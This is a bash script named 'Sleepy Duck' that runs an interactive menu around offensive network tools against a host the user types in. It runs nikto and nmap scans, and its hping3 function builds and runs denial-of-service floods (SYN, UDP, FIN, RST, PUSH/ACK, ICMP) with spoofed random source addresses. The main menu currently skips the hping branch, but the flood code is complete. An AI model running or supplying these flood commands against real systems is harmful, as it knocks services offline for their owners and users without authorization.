#!/bin/bash
# Welcome to the Sleepy Duck
# Author: Aleksandr Krasnov
# Contact: https://www.linkedin.com/in/alekkras

# Define colors for pretty output

red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'

# Ask the user for the target
# The webserver would be the target
intro()
{
echo "What is your ${red}target${end}?"
echo ""
echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read target
echo "$target" > target.txt #use  >> if you would like to append instead of overwriting
}



# If you would like to perform vulnerability assessment, that is the first thing you should do
# For first-timers, perform everything is an option suggested
nmap()
{
    echo "Would you like to run a basic vulnerability assessment [nmap]?(y/n)"
    echo -n "{grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read response
    if [[ $response == "Y" || $response == "y" ]]; then
        echo "${grn}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  ${end}"
        echo "${grn}                Great! Here are some options for you!                ${end}"
        echo "${grn}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  ${end}"
        echo "1) Automatically perform everything (it should take about 30 mins)"
        echo "2) HTTP headers"
        echo "3) Any possible exploits"
        echo "Which one would you like to perform?"
        echo -n "{grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read ch
        if [[ $ch == "1" ]]; then
          cd scripts
          bash 1.sh
        elif [[ $ch == "2" ]]; then
          cd scripts
          bash 2.sh
        elif [[ $ch == "3" ]]; then
          cd scripts
          bash 3.sh
        else
          echo "We will not run any of scripts as you said"
        fi

    else
        echo "We will not run any of scripts as you said"
    fi
}
#nmap

#nikto - overall basic scan [vulnerability assessment]
nikto()
{
    echo "Would you like to perform a vulnerability assessment?(y/n)?"
    echo ""
    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read nikto
    if [[ $nikto == "Y" || $nikto == "y" ]]; then
        touch attack_nikto.txt
        echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
        echo -n "$target" >> attack_nikto.txt
        bash attack_nikto.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
#nikto


#hping
hping()
{

    echo "Would you like to perform Flood? [hping3] (y/n)?"
    echo ""
    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read hping
    if [[ $hping == "Y" || $hping == "y" ]]; then
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo "Here are possible options on what to do?"
        echo " "
        echo "1) Check whether a host is alive (when PING is blocked) - send RST"
        echo "2) Perform DoS attack"
        echo "3) Perform UDP flood"
        echo "4) Perform TCP FIN flood"
        echo "5) Perform TCP RST flood"
        echo "6) Perform PUSH and ACK floods"
        echo "7) Perform ICMP and IGMP floods"
        echo "8) Exit"
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo "Which one would you like to do?"
        echo -n "${red}(づ｡◕‿‿◕｡)づ     ${end}" ; read choice
        if [[ $choice == "1" ]]; then
          cd results/hping/
          touch host_alive.txt
          echo -n "hping3 -c 1 -V -p 80 -s 5050 -F " > host_alive.txt
          cd ../..
          echo -n "$target" >> results/hping/host_alive.txt
          cd results/hping/
          bash host_alive.txt
          cd ../..
          hping
        elif [[ $choice == "2" ]]; then
          cd results/hping/
          touch hping_dos.txt
          echo -n "hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source " > hping_dos.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_dos.txt
          cd results/hping/
          bash hping_dos.txt
          cd ../..
          hping

        elif [[ $choice == "3" ]]; then
          cd results/hping/
          touch hping_udp.txt
          echo -n "hping3 --flood --rand-source --udp -p 80 " > hping_udp.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_udp.txt
          cd results/hping/
          bash hping_udp.txt
          cd ../..
          hping

        elif [[ $choice == "4" ]]; then
          cd results/hping/
          touch hping_tcp_fin.txt
          echo -n "hping3 --flood --rand-source -F -p 80 " > hping_tcp_fin.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_tcp_fin.txt
          cd results/hping/
          bash hping_tcp_fin.txt
          cd ../..
          hping

        elif [[ $choice == "5" ]]; then
          cd results/hping/
          touch hping_tcp_rst.txt
          echo -n "hping3 --flood --rand-source -R -p 80 " > hping_tcp_rst.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_tcp_rst.txt
          cd results/hping/
          bash hping_tcp_rst.txt
          cd ../..
        elif [[ $choice == "6" ]]; then
          cd results/hping/
          touch hping_puch_ack.txt
          echo -n "hping3 --flood --rand-source -PA -p 80 " > hping_puch_ack.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_puch_ack.txt
          cd results/hping/
          bash hping_puch_ack.txt
          cd ../..
        elif [[ $choice == "7" ]]; then
          cd results/hping/
          touch hping_icmp_igmp.txt
          echo -n "hping3 --flood --rand-source -1 -p 80 " > hping_icmp_igmp.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_icmp_igmp.txt
          cd results/hping/
          bash hping_icmp_igmp.txt
          cd ../..
        else
          echo "Would you like to do it over again? (y/n)"
          echo -n "${red}(ಠ_ಠ)    ${end}" ; read repeat
          if [[ $repeat == "Y" || $repeat == "y" ]]; then
            hping
          else
            exit
          fi
        fi
    else
        echo "We will not run any of scripts as you said"

fi
}
#hping

main()
{
  echo "Welcome to the Sleepy-Duck"
  echo "Let's find the target!!!"
  intro
  echo "What would you like to perform?"
  echo "1) Nikto"
  echo "2) Nmap"
  echo "3) Hping3"
  echo "What would ${cyn}you${end} like to do"
  echo ""
  echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read option
  if [[ $option == "1" ]]; then
    nikto
  elif [[ $option == "2" ]]; then
    nmap
  elif [[ $option == "3" ]]; then
    #hping
    continue
  else
    echo "Bye"
fi
}
main
